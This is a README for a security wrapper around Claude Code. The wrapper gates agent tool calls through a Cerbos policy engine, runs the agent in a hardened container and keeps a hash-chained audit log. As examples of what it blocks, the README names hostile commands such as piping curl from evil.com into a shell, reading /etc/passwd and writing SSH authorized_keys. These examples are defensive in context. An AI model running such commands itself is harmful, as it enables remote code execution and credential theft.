```
███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗
██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  ██║  ██║
╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  ██║  ██║
███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗██████╔╝
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
            ██████╗██╗      █████╗ ██╗   ██╗██████╗ ███████╗
           ██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝
           ██║     ██║     ███████║██║   ██║██║  ██║█████╗
           ██║     ██║     ██╔══██║██║   ██║██║  ██║██╔══╝
           ╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗
            ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
```

<p align="center"><b>The comfort of Claude Code, secured by design.</b></p>

<p align="center">
  <a href="https://gitlab.com/benoit.besson/secured-claude/-/pipelines"><img src="https://gitlab.com/benoit.besson/secured-claude/badges/main/pipeline.svg" alt="pipeline"></a>
  <a href="docs/security/threat-model.md"><img src="https://img.shields.io/badge/security--audit-pass-brightgreen" alt="security audit"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="license"></a>
  <a href="pyproject.toml"><img src="https://img.shields.io/badge/python-3.11%2B-blue" alt="python"></a>
  <a href="https://cerbos.dev"><img src="https://img.shields.io/badge/policy--engine-cerbos-ff6b35" alt="cerbos"></a>
  <a href="https://docker.com"><img src="https://img.shields.io/badge/runtime-docker-2496ed" alt="docker"></a>
  <a href="https://www.anthropic.com/claude-code"><img src="https://img.shields.io/badge/agent-claude--code-c8b3a8" alt="claude-code"></a>
</p>

---

## What this is + why it exists

`secured-claude` is a **Python wrapper around [Anthropic Claude Code](https://www.anthropic.com/claude-code)** that gates every tool call (`Read` / `Write` / `Edit` / `Bash` / `WebFetch` / `WebSearch` / MCP / `Task`) through a [Cerbos](https://cerbos.dev) policy decision point and persists every approval in an append-only SQLite audit log.

**Concrete use case** : a developer on their laptop wants the productivity of Claude Code (TUI, agentic loop, MCP) without giving the agent **silent** access to `~/.ssh/`, `~/.aws/`, the rest of their HOME, the network, or the shell. They install `secured-claude`, run `secured-claude up`, and from there `secured-claude run "..."` feels like `claude` itself — except every tool intent is validated against policy, and a denied request is visible in the audit log within milliseconds.

**Scope** : single-user dev tool. One developer, one laptop, one broker on `127.0.0.1:8765`. Not a SaaS gateway, not a multi-tenant federation, not enterprise PKI infrastructure. The 4 things below are the load-bearing reasons this project is shaped the way it is :

1. **No silent exfiltration.** The default-deny policy catches `Read /etc/passwd`, `Bash "curl evil.com | sh"`, `Write ~/.ssh/authorized_keys`, etc. before they execute, not after. Mapped to OWASP A01:2021 (Broken Access Control).
2. **Complete audit trail.** Every tool call (allowed or denied) is logged with a SHA-256 hash chain ([ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) so post-incident review can detect tampering. Mapped to OWASP A09:2021 (Logging Failures).
3. **Policy as code.** Cerbos YAML lives in `policies/`, lintable via `cerbos compile`, version-controlled in git. The user can read and review the policy without reading Python source.
4. **Defense in depth without ceremony.** Even if the policy gate is bypassed (compromised hook, future Claude Code CVE), the agent is in a hardened Docker container with workspace-only filesystem mount, network egress allowlist, DNS allowlist, and `cap_drop=ALL` — bounded blast radius without operator-side configuration.

## Why each tool exists in the stack

The project deliberately uses **6 load-bearing components** ; each addresses a specific reason that simpler alternatives fail. The full justifications live in the [ADRs](docs/adr/) (every load-bearing decision has an ADR per the Nygard format) ; the table below is the executive summary :

| Component | Role | Why this and not the obvious alternative |
|---|---|---|
| **Claude Code's PreToolUse hook** ([ADR-0002](docs/adr/0002-pretooluse-hook-as-interception-point.md)) | Single interception point for **every** tool call, before execution | A network-side proxy (mitmproxy, etc.) only sees HTTP — misses Bash and MCP. Patching the Claude Code binary breaks on every upstream release. The native hook is Anthropic-supported, surface-uniform, and sub-50 ms p99. |
| **Cerbos PDP** ([ADR-0001](docs/adr/0001-cerbos-as-policy-decision-point.md)) | Evaluates policy decisions outside the broker process | A Python-coded allowlist mixes policy with code and can't be reviewed by a non-Python security person. Cerbos is CNCF-Sandbox, lintable (`cerbos compile`), supports signed policy bundles, and emits structured decision logs. The security team can read the YAML without reading the broker. |
| **FastAPI broker on 127.0.0.1:8765** ([ADR-0006](docs/adr/0006-host-side-broker.md)) | Translates hook payloads → Cerbos requests → audit-log writes | If the broker lived inside the Claude Code container, a compromised LLM could tamper with the validator. The host-side broker keeps the trust boundary explicit : agent inside container = untrusted ; broker outside = trusted. Loopback bind = the trust boundary IS network-isolation. |
| **Append-only SQLite audit log** ([ADR-0004](docs/adr/0004-append-only-sqlite-audit-log.md), [ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) | Persists every decision with a tamper-evident SHA-256 chain | A JSON-lines log file is human-readable but trivially editable. SQLite is durable, queryable, single-file, cross-platform, and supports a trigger that REJECTS UPDATE / DELETE — guaranteeing append-only at the DB level. |
| **Docker containerisation** ([ADR-0005](docs/adr/0005-containerised-claude-code.md)) | Confines the agent to `/workspace/` ; bounds blast radius if the policy gate is bypassed | Host-installed Claude Code can read the entire HOME on the first approved Bash command. Containerised, even an approved `git status` only sees `/workspace/`. v0.4 made this a multi-arch (amd64 + arm64) cosign-signed image ([ADR-0028](docs/adr/0028-multi-arch-images-manifest-list.md)) for Apple Silicon parity. |
| **L2 + L3 + L4 confinement** ([ADR-0019](docs/adr/0019-l2-egress-proxy-tinyproxy.md), [ADR-0020](docs/adr/0020-l3-dns-allowlist-dnsmasq.md), [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md)) | tinyproxy (egress allowlist) + dnsmasq (DNS allowlist) + cap_drop/seccomp/read-only | If the L1 hook is bypassed, the agent still can't reach `evil.com` (egress denies CONNECT), can't resolve `evil.com` (DNS returns REFUSED), and can't escalate (cap_drop ALL). Independent confinement per [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) — bypassing one doesn't bypass the others. |

**Read [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) before evaluating "is this defense in depth or marketing"** : we explicitly distinguish the **1 intent layer** (L1, the hook + Cerbos — the only layer that understands the agent's *intent*) from the **3 confinement layers** (L2/L3/L4 — they bound blast radius but don't replace L1's semantic decisions). That ADR superseded the earlier v0.1 framing of "4 independent layers" which was overstated.

## Technical decomposition

```
┌─────────────────────────── HOST ────────────────────────────┐   ┌─────────── DOCKER ───────────┐
│                                                             │   │                              │
│  ┌──────────────────┐   ┌──────────────────┐                │   │  ┌─────────────────────┐    │
│  │ secured-claude   │   │ FastAPI broker   │   POST /check  │   │  │ cerbos/cerbos       │    │
│  │ (CLI, Python)    │──▶│ 127.0.0.1:8765   │ ◀──────────────┼───┼──│ HTTP :3592          │    │
│  │ orchestrator +   │   │ + audit DB       │                │   │  │ policies/*.yaml     │    │
│  │ docker SDK       │   │ + Prometheus     │                │   │  └─────────────────────┘    │
│  └──────────────────┘   └──────────────────┘                │   │                              │
│       ▲   spawns                ▲                           │   │  ┌─────────────────────┐    │
│       │                         │                           │   │  │ secured-claude/     │    │
│       │                         │ HTTP CheckResources       │   │  │ claude-code         │    │
│       │                         ▼                           │   │  │ /workspace mounted  │    │
│  ┌──────────────────┐                                       │   │  │ PreToolUse hook ───┼───▶│
│  │ user terminal    │                                       │   │  └─────────────────────┘    │
│  └──────────────────┘                                       │   │                              │
└─────────────────────────────────────────────────────────────┘   └──────────────────────────────┘
```

**Flow of one tool call** :

1. The user runs `secured-claude run "refactor src/foo.py"`. The CLI (orchestrator) ensures the cerbos + claude-code containers are up, then attaches a TTY to the agent container.
2. Inside the agent container, Claude Code decides to invoke `Edit src/foo.py`.
3. The **PreToolUse hook** fires, executes the bundled `secured-claude-hook` Python binary, which POSTs `{tool, tool_input, principal_id, session_id}` to the broker on `host.docker.internal:8765`.
4. The **broker** receives the request, maps `(Edit, file_path=src/foo.py)` → Cerbos resource `(file, edit, attr={path})`, sends a `CheckResources` request to the cerbos container.
5. **Cerbos** evaluates `policies/filesystem.yaml` against the request, returns `EFFECT_ALLOW` or `EFFECT_DENY`.
6. The broker writes the decision into the **SQLite audit log** (with SHA-256 hash chaining), then returns the result to the hook.
7. The hook prints the standard Claude Code hook JSON (`{"permissionDecision": "allow"|"deny", "permissionDecisionReason": "..."}`) and exits. Claude Code either runs the edit or surfaces the deny reason to the LLM, which can then ask a different question.

End-to-end p99 latency budget : 50 ms ([ADR-0002](docs/adr/0002-pretooluse-hook-as-interception-point.md) target). Typical observed : 5-15 ms on cache-warm Cerbos.

The full runtime decomposition lives in [`src/secured_claude/`](src/secured_claude/) :

| File | Responsibility |
|---|---|
| `cli.py` | argparse-based subcommand routing : `up`, `down`, `run`, `audit`, `audit-demo`, `policy lint/stats/template`, `principal validate`, `audit-anchor`, `doctor` |
| `orchestrator.py` | Docker SDK lifecycle (pull, up, down, exec) + cross-platform path handling |
| `gateway.py` | FastAPI `/check` + `/health` + `/metrics` route, tool→Cerbos-resource mapping |
| `cerbos_client.py` | Thin `requests` wrapper for `/api/check/resources` |
| `principals.py` | `YAMLPrincipalProvider` + `HTTPPrincipalProvider` (with TTL cache + bearer + mTLS + max-stale-age + per-issuer config) |
| `oidc.py` | `OIDCVerifier` + `MultiIssuerVerifier` for JWT validation against IdP JWKS |
| `metrics.py` | Prometheus counters + histograms (used for `curl /metrics` diagnostics, not SLO infra) |
| `store.py` | SQLite append-only audit log with SHA-256 hash chain + external anchor commands |
| `hook.py` | The PreToolUse hook entry point bundled into the agent container |
| `audit.py` + `audit_demo.py` | `audit` query command + 35-scenario red-team replay battery |

## Status — verify in 60 seconds

**v0.9.0** — every claim below is backed by an artifact you can re-run yourself.
**Don't trust the README, run the verifications.**

```bash
git clone https://gitlab.com/benoit.besson/secured-claude.git
cd secured-claude
uv sync --all-extras

# 1. Static gates (~20 s warm) — runs the same 13-layer pipeline as CI
bash bin/security-scans.sh
#   → ruff/mypy/bandit clean ; pip-audit/grype/trivy 0 CVE ;
#     gitleaks 0 ; hadolint/shellcheck/cerbos compile clean ;
#     pytest 321/321, coverage 91.27 % ; SBOM 140 packages.

# 2. Live policy gate (~30 s) — boots a real Cerbos PDP and replays
#    28 red-team + 7 happy-path scenarios end-to-end (35 total) :
bash bin/security-audit.sh
#   → Verdict ✅ PASS (35/35) — every red-team DENY, every happy-path ALLOW.

# 3. Last green CI pipeline on macbook-local runner :
#    https://gitlab.com/benoit.besson/secured-claude/-/pipelines/2487406196
#    14/14 jobs across lint / test / security / build, ~9 min wall.

# 4. Runtime end-to-end (needs ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN) :
secured-claude up
docker exec secured-claude-agent claude -p "Read /etc/passwd"
#   → claude attempts the Read tool, the PreToolUse hook posts to the
#     broker, Cerbos returns DENY, claude responds gracefully :
#     "A hook in your Claude Code configuration is blocking the Read
#      tool from accessing /etc/passwd ..."
secured-claude audit --denied
#   → the DENY decision is visible in the SQLite audit log,
#     5 ms duration, with cerbos_reason captured.
```

### What is real now (v0.9.0)

| Claim | Where | How to check |
|---|---|---|
| Cerbos PDP gating every tool call | `policies/*.yaml`, `src/secured_claude/cerbos_client.py`, `src/secured_claude/gateway.py` | `bin/security-audit.sh` (26/26) |
| FastAPI broker on host:8765 | `src/secured_claude/gateway.py` (75 lines, 100 % covered) | `tests/test_gateway.py` (8 tests) |
| Append-only SQLite audit | `src/secured_claude/store.py` (85 lines, 98 % covered) | `tests/test_store.py` includes UPDATE/DELETE refused by trigger |
| Claude Code container hardened | `Dockerfile.claude-code` + `docker-compose.yml` (non-root UID 1001, read-only cerbos rootfs, cap_drop ALL, healthcheck) | `secured-claude doctor`, `secured-claude up` |
| 48 ADRs justifying every decision | `docs/adr/0000-template.md` + `0001..0047-*.md` | `ls docs/adr/` |
| GitLab CI green on macbook-local runner | `.gitlab-ci.yml` + `.gitlab-ci/{lint,test,security,build,publish,release}.yml` | [pipeline #2487406196](https://gitlab.com/benoit.besson/secured-claude/-/pipelines/2487406196) |
| 7-layer security pipeline | `bin/security-scans.sh` + `pyproject.toml [tool.bandit]` | `bash bin/security-scans.sh` |
| SBOM (SPDX 2.3) per release | `.gitlab-ci/security.yml::security:sbom` | release artifact `sbom.spdx.json` |

### What is configured but NOT yet enforced — be explicit

A senior security reviewer should read this table before trusting any
"defense-in-depth" claim. v0.2.x ships **L1 + L2 + L3-DNS enforced**
(L2 closed via tinyproxy egress sidecar in [ADR-0019](docs/adr/0019-l2-egress-proxy-tinyproxy.md),
DNS leak closed via dnsmasq in [ADR-0020](docs/adr/0020-l3-dns-allowlist-dnsmasq.md)).
The remaining gaps below are documented ahead of being live.

| Item | v0.2 reality | When it goes live |
|---|---|---|
| **Audit log tamper-evidence at FS layer** | **v0.3 closed in-DB tamper-evidence** ([ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) — SHA-256 chain over each row ; `audit-verify` exits non-zero on chain break. **v0.4 closes the `rm approvals.db` gap** ([ADR-0029](docs/adr/0029-external-hash-anchor.md)) — `secured-claude audit-anchor` emits a JSON commit to the latest row hash that the operator stores externally (S3 with object-lock, RFC 3161 TSA, Rekor, GPG-signed git…) ; `audit-verify-anchor` detects post-anchor tampering OR file deletion. | Done in v0.3 (in-DB) + v0.4 (external) |
| **Multi-principal Cerbos roles** | **v0.3.1 closed the directory side** ([ADR-0027](docs/adr/0027-multi-principal-directory.md)) — `config/principals.yaml` maps `principal_id` to `roles + attributes`, broker resolves at request time so `derived_roles.yaml` (trusted_agent, auditor) activate end-to-end. **v0.9.0 closes the agent side** ([ADR-0047](docs/adr/0047-multi-principal-session-activation.md)) — `secured-claude run --principal <id>` and `exec --principal <id>` thread the env override through `docker compose exec -e ...` so an operator picks the principal per-session without restarting the container. `secured-claude principal list` surfaces the catalogue. | Done in v0.3.1 (directory) + v0.9.0 (session activation) |
| **Runtime smoke in CI** (image wiring + real LLM) | **v0.3.1 closed the wiring smoke** ([ADR-0026](docs/adr/0026-runtime-smoke-ci-gate.md)) — `smoke:runtime` pulls the 3 just-built images on every tag/main pipeline and verifies wiring without API burn. **v0.4 closes the real-LLM smoke** ([ADR-0030](docs/adr/0030-real-llm-smoke-manual-trigger.md)) — `smoke:llm-real` is a manual-trigger job on every tag pipeline ; operator sets `ANTHROPIC_API_KEY_SMOKE` (protected, masked) and clicks to run. Full-stack (broker + sidecars + Cerbos) smoke deferred to v0.4.1 (needs broker containerisation). | Done in v0.3.1 (wiring) + v0.4 (real-LLM, manual) |
| **read_only on egress-proxy / dns-filter sidecars** | **v0.3 closes this** ([ADR-0025](docs/adr/0025-pre-built-sidecar-images.md)) — dedicated `Dockerfile.dns-filter` + `Dockerfile.egress-proxy`, packages baked in, no apk-install-at-boot. `read_only: true` is back, sidecars run as `nobody` / `tinyproxy` with minimal caps. **v0.3.1 closes the cosign signing** — both sidecar images now signed via the keyless OIDC pipeline ([ADR-0016](docs/adr/0016-supply-chain-cosign-sbom.md)) alongside the agent. | Done in v0.3 (image-level + non-root) + v0.3.1 (cosign-signed) |
| **Multi-arch image (linux/amd64 + linux/arm64 native)** | **v0.4 closes this** ([ADR-0028](docs/adr/0028-multi-arch-images-manifest-list.md)) — per-arch Kaniko builds (amd64 + arm64) on the macbook-local runner + `crane index append` combines into a manifest-list under the canonical tag. Apple Silicon / AWS Graviton users get native arm64 ; amd64 users get native amd64. Cosign signs the index ; the signature covers both arches per cosign-on-manifest-list semantics. | Done in v0.4 |
| **Hook coverage of every Claude Code tool** | `matcher: "*"` in PreToolUse hooks every tool we know about (Read/Write/Edit/Bash/WebFetch/WebSearch/MCP/Task). Anthropic adds tools faster than we audit ; **a new tool shipping in a future Claude Code release would default to ALLOW until we map it**. Mitigated by the broker's `unknown_tool` catch-all (kind=`unknown_tool` action=`invoke`) which has no policy rule → DENY by Cerbos default ; verified by `tests/test_gateway.py::test_map_unknown_tool_falls_back`. | Continuous — Renovate bumps Claude Code, audit-demo adds scenarios per new tool |

### What we explicitly DON'T claim to defend against

- Kernel CVEs / 0-days — Linux namespace isolation is the v0.1 boundary ; gVisor or Firecracker tracked v0.3+
- Side-channel attacks (Spectre/Meltdown class)
- Physical adversary at the developer machine
- Compromise of `cerbos/cerbos` upstream image — mitigated by digest pinning ; residual risk acknowledged

### Honest scoring : 1 intent layer + 3 confinement layers (v0.2)

Per [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) — only L1 understands the agent's intent. L2/L3/L4 are confinement layers that bound the blast radius if L1 is bypassed but don't replace L1's semantic decisions.

| Role | Layer | Designed | Enforced in v0.2 | Tested in v0.2 |
|---|---|---|---|---|
| **Intent** | **L1 — PreToolUse hook + Cerbos PDP** ([0001](docs/adr/0001-cerbos-as-policy-decision-point.md), [0002](docs/adr/0002-pretooluse-hook-as-interception-point.md)) | Yes | Yes | `bin/security-audit.sh` → 26/26 PASS + runtime smoke transcript |
| **Confinement** | **L2 — Network egress allowlist** ([ADR-0019](docs/adr/0019-l2-egress-proxy-tinyproxy.md)) | Yes | **Yes** — tinyproxy `FilterDefaultDeny` ; CONNECT to non-allowlisted host returns 403 | End-to-end : `curl -x http://172.30.42.4:3128 https://evil.com` → `CONNECT tunnel failed, response 403` (proof in ADR-0019) |
| **Confinement** | **L3 — DNS allowlist** ([ADR-0020](docs/adr/0020-l3-dns-allowlist-dnsmasq.md)) | Yes | **Yes** — dnsmasq `no-resolv` ; `nslookup evil.com` → REFUSED | End-to-end : `nslookup evil.com 172.30.42.3` → `REFUSED` (proof in ADR-0020) |
| **Confinement** | **L3 — Filesystem confinement** | Yes | Yes — only `/workspace` mounted RW from host | Inferred ; no explicit test that `/Users/<me>/.ssh` is unreachable |
| **Confinement** | **L4 — Container hardening** | Yes | Yes for the agent : non-root + cap_drop ALL + seccomp default + read-only rootfs + cgroup `mem_limit: 4g` ; sidecars partial (read_only deferred — see "configured but NOT yet enforced" above) | Inferred ; no explicit test (`docker inspect` would prove flags are set) |

Reading : v0.2 holds **L1 (intent) + L2 (egress confinement) + L3 (DNS + FS confinement) + partial L4 (container hardening)**. Per
[ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md), only L1
sees the agent's intent — it decides "this Read of `/etc/passwd` is
denied because the path matches a deny-list pattern." L2/L3/L4 are
**confinement layers** : they don't understand intent, but they bound
the blast radius if L1 is bypassed (a compromised Claude Code binary
can only reach `api.anthropic.com` via L2, can only resolve
`*.anthropic.com` via L3-DNS, can only read paths mounted into the
container via L3-FS, and runs without privileges via L4). Compromise
of L1 is therefore *bounded*, not *catastrophic* — but L2/L3/L4 don't
*replace* L1's semantic decisions. The remaining v0.3 gaps
(FS-tamper-evident audit log, multi-principal, runtime-smoke-in-CI,
read_only on sidecars) are documented above.

Full honest limits in the residual-risks table in [`docs/security/threat-model.md`](docs/security/threat-model.md).

---

> **What this project demonstrates mastery of**
>
> Honest framing : `secured-claude` is a **single-user dev tool** — one developer on their laptop, loopback broker, no operator team. The bullets below describe the load-bearing security properties for that use case. v0.7.x added some optional extension points (multi-issuer, mTLS, per-issuer config, observability histograms) — those are documented in their ADRs with explicit "Scope honesty" addenda noting they're speculative for the primary use case ; operators with the rare deployment that needs them have them, the rest ignore them.
>
> - 🔒 **Sécurité** — defense-in-depth : **1 intent layer + 3 confinement layers** ([ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md)). L1 (PreToolUse hook + Cerbos PDP) is the semantic gate that understands the agent's *intent* and decides on policy. L2 (tinyproxy egress allowlist), L3 (dnsmasq DNS allowlist + workspace-only FS mount), and L4 (cap_drop + read_only + seccomp + cgroups) bound the blast radius if L1 is bypassed. Hash-chain audit log + external anchor (ADR-0024 + ADR-0029). 5 cosign-signed multi-arch images cover binary + policy bytes (ADR-0028 + ADR-0035 + ADR-0036). Optional external-IdP integration : YAML directory or HTTP fetch with TTL cache + bearer auth + stale-on-error + bounded staleness (ADR-0034 + ADR-0037 + ADR-0039), and end-to-end JWT validation against the IdP's JWKS so a malicious local process can't spoof the agent's principal_id (ADR-0038).
> - 🤖 **IA** — Claude Code wrapped in a policy-gated container, every tool call (Read / Write / Edit / Bash / WebFetch / MCP / Task) intercepted via the native PreToolUse hook.
> - 🏛 **Architecture** — Hexagonal-lite Python broker (host) + Cerbos PDP (container) + Claude Code CLI (container) ; clear trust boundary between intent (LLM) and execution (broker). 48 ADRs covering every security + operational decision (incl. ADR-0045 formally rejecting agent↔broker mTLS / background JWKS refresh / OTLP push as out-of-scope ; ADR-0046 shipping on-the-fly secret redaction for Read results in v0.8.0 ; ADR-0047 activating multi-principal sessions in v0.9.0).
> - 📊 **Observabilité** — Prometheus counters + histograms at `/metrics` (loopback-only) covering JWT-deny / JWKS-degraded / stale-cache / cerbos-unavailable + end-to-end + per-stage latencies (ADR-0042 + ADR-0043). Useful for "is the broker slow ?" diagnostics via `curl /metrics` ; the SaaS-tier SLO alert framing originally in ADR-0043 was redressed in the scope-honesty pass.
> - ✅ **Qualité** — 321 unit + integration tests, 91.27 % coverage (gate 90 %). Security audit demonstration with 28 red-team scenarios + 7 happy-paths + policy fuzz + 8 static scans, run on every release.
> - 🔄 **CI/CD** — GitLab CI 8 stages (lint / test / security / build / smoke / publish / release), audit-demo strict gate on releases, cosign keyless signing + Syft SBOM for supply-chain provenance. Tag-pipeline hardened against Docker Hub rate limits (mirror.gcr.io) + idempotent re-tag publish (twine shell-wrap).
> - ☁️ **Infrastructure** — Cross-platform install (Mac / Linux / Windows) via pipx + GitLab Package Registry ; Docker images pinned by digest ; native multi-arch (amd64 + arm64) per ADR-0028.
> - 🛠 **DevX** — `secured-claude` CLI feels like `claude` (TTY preserved) ; `audit` subcommand surfaces the evolving allowlist ; `doctor` validates the install end-to-end ; principal directory pluggable via env. Optional extension points (multi-issuer ALLOWLIST, mTLS on IdP fetches, per-issuer JSON config) for deployments that need them, no-op for the typical single-tenant case.

---

## Verify the artifacts (no clone needed — ADR-0023)

Every released `vX.Y.Z` carries 6 asset links on its [GitLab Release page](https://gitlab.com/benoit.besson/secured-claude/-/releases). Skip the source ; download the proof :

```bash
TAG=v0.2.1   # or whichever tag you want to audit
BASE=https://gitlab.com/benoit.besson/secured-claude

# 1. SBOM (SPDX 2.3) — what's in the image
curl -fsSL "$BASE/-/jobs/artifacts/$TAG/raw/sbom.spdx.json?job=security:sbom" \
  -o sbom-$TAG.spdx.json
# Sanity check : file is not 4xx HTML, has packages
jq '.packages | length' sbom-$TAG.spdx.json   # should print > 0

# 2. CVE scan (Trivy filesystem) — was it CVE-clean at release time
curl -fsSL "$BASE/-/jobs/artifacts/$TAG/raw/trivy.json?job=security:trivy" \
  -o trivy-$TAG.json
jq '.Results[].Vulnerabilities | length' trivy-$TAG.json   # 0 = clean

# 3. CVE cross-check (Grype) — independent verification of #2
curl -fsSL "$BASE/-/jobs/artifacts/$TAG/raw/grype.json?job=security:grype" \
  -o grype-$TAG.json

# 4. Secret scan (Gitleaks) — did the release accidentally commit a secret
curl -fsSL "$BASE/-/jobs/artifacts/$TAG/raw/gitleaks.json?job=security:gitleaks" \
  -o gitleaks-$TAG.json
jq 'length' gitleaks-$TAG.json   # 0 = no leaks

# 5. Coverage XML — `cat coverage-$TAG.xml | xmllint --xpath ...` to read percentage
curl -fsSL "$BASE/-/jobs/artifacts/$TAG/raw/coverage.xml?job=test:py313" \
  -o coverage-$TAG.xml

# 6. Image signatures — verify cosign keyless OIDC (ADR-0016) on all 3 images.
#    Agent + both sidecars are signed since v0.3.1 (ADR-0025 + cosign extension).
for img in claude-code dns-filter egress-proxy; do
  cosign verify \
    registry.gitlab.com/benoit.besson/secured-claude/$img:$TAG \
    --certificate-identity-regexp '^https://gitlab.com/benoit.besson/secured-claude' \
    --certificate-oidc-issuer https://gitlab.com \
  || echo "FAIL on $img"
done
```

**No clone required.** The links resolve to immutable CI artifacts with 1-year retention. Recipients get the same bytes you'd see at release time. Tag annotations (`git show $TAG`) carry the full verification log including pipeline IDs and local test pass — `gh release view` / `glab release view` surface the same.

What this defends against : "you say you have 92 % coverage but I can't verify" → here's the coverage XML. "You say there are 0 CVEs but maybe a recent CVE landed and you didn't rescan" → re-run grype against the `sbom-$TAG.spdx.json` today. "You say the image is signed but how do I know" → cosign verify, with no clone.

---

## Quick start

```bash
# Mac / Linux
curl -sSL https://gitlab.com/benoit.besson/secured-claude/-/raw/main/install.sh | bash

# Windows (PowerShell)
irm https://gitlab.com/benoit.besson/secured-claude/-/raw/main/install.ps1 | iex

# Then:
export ANTHROPIC_API_KEY=sk-ant-...
secured-claude up                       # start cerbos + claude-code containers
secured-claude run "refactor src/foo"   # interactive Claude Code, every tool gated
secured-claude audit --denied           # show what was blocked
secured-claude down                     # stop everything
```

## Architecture

```
HOST                                     DOCKER (network: secured-claude-net)
┌────────────────────────────┐         ┌──────────────────────────────────────┐
│ secured-claude (Python CLI)│         │  ┌──────────────────────────────┐    │
│                            │         │  │ cerbos/cerbos                 │    │
│  orchestrator (docker SDK) │ ◀────── │  │ HTTP :3592, policies/*.yaml   │    │
│  gateway (FastAPI :8765)   │         │  └──────────────────────────────┘    │
│  cerbos_client             │         │  ┌──────────────────────────────┐    │
│  store (SQLite append-only)│ ◀────── │  │ secured-claude/claude-code   │    │
│                            │         │  │ - claude CLI                  │    │
└────────────────────────────┘         │  │ - PreToolUse hook → host:8765 │    │
              ↑                        │  │ - /workspace mounted RW       │    │
       user terminal                   │  └──────────────────────────────┘    │
                                       └──────────────────────────────────────┘
```

Full design : see the **Technical decomposition** section above + the [48 ADRs](docs/adr/).

## Security

- **Threat model** : [`docs/security/threat-model.md`](docs/security/threat-model.md) — STRIDE table mapping each threat to which defense layer catches it.
- **Audit demonstration** : `secured-claude audit-demo --strict` runs 28 red-team scenarios + 7 happy-paths (35 total — covers FS exfil, FS inject, Shell RCE, Net exfil, MCP abuse, Path traversal, MCP poisoning, prompt-injection-via-Read, supply-chain tool-rebind) + 50+ policy fuzz variants + 8 static scans, produces a timestamped report. Required to pass before every release.
- **Policy as code** : [`policies/`](policies/) — Cerbos YAML, lintable via `cerbos compile`, signable via Cerbos signed bundles. New deployments scaffold via `secured-claude policy template developer-default --output policies/`.
- **Audit log** : SQLite append-only at `~/.local/share/secured-claude/approvals.db` (Linux) / `~/Library/Application Support/secured-claude/` (Mac) / `%LOCALAPPDATA%\secured-claude\` (Windows). Tamper-evident SHA-256 hash chain ([ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) + external anchor for FS-layer tamper detection ([ADR-0029](docs/adr/0029-external-hash-anchor.md)).

## Architecture decisions

The 48 ADRs in [`docs/adr/`](docs/adr/) justify every load-bearing choice. Highlights :

| # | Decision | Why it matters |
|---|---|---|
| [0001](docs/adr/0001-cerbos-as-policy-decision-point.md) | Cerbos as PDP | CNCF, signable, lintable, security-team familiar |
| [0002](docs/adr/0002-pretooluse-hook-as-interception-point.md) | PreToolUse hook interception | Native Claude Code mechanism — no binary patching |
| [0009](docs/adr/0009-hook-fails-closed.md) | Hook fails closed | Broker down → DENY by default, never bypass |
| [0019](docs/adr/0019-l2-egress-proxy-tinyproxy.md) | L2 tinyproxy CONNECT allowlist | Closes the v0.1 design-only L2 gap |
| [0020](docs/adr/0020-l3-dns-allowlist-dnsmasq.md) | L3 dnsmasq DNS allowlist | Closes R-DNS-LEAK |
| [0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) | 1 intent layer + 3 confinement layers | Honest framing — supersedes ADR-0012 |
| [0016](docs/adr/0016-supply-chain-cosign-sbom.md) | Cosign + SBOM | Provenance per OWASP A08:2021 |
| [0021](docs/adr/0021-pin-claude-code-npm-version.md) | Pin Claude Code npm + Renovate | Closes the @latest hole in ADR-0008 |
| [0046](docs/adr/0046-on-the-fly-secret-redaction.md) | On-the-fly secret redaction | Closes the content-level exfil vector — secrets in Read results never reach the LLM |
| [0047](docs/adr/0047-multi-principal-session-activation.md) | Multi-principal session activation | `secured-claude run --principal <id>` per-session ; the v0.1 derived roles (trusted_agent, auditor) finally usable end-to-end |

## Documentation map

- 📦 [`CHANGELOG.md`](CHANGELOG.md) — per-version history (each entry links to the full annotated git tag)
- 🤝 [`CONTRIBUTING.md`](CONTRIBUTING.md) — how to set up the dev env, run the gates, write commits, propose ADRs
- 🔒 [`docs/security/`](docs/security/) — threat model, controls matrix, supply-chain story, vulnerability disclosure, evidence
- 🛠 [`docs/dev/`](docs/dev/) — developer environment + debug recipes (e.g. agent-container hang investigation)
- 🏛 [`docs/adr/`](docs/adr/) — 47 architecture decision records

## License

[MIT](LICENSE) — Benoit Besson, 2026.
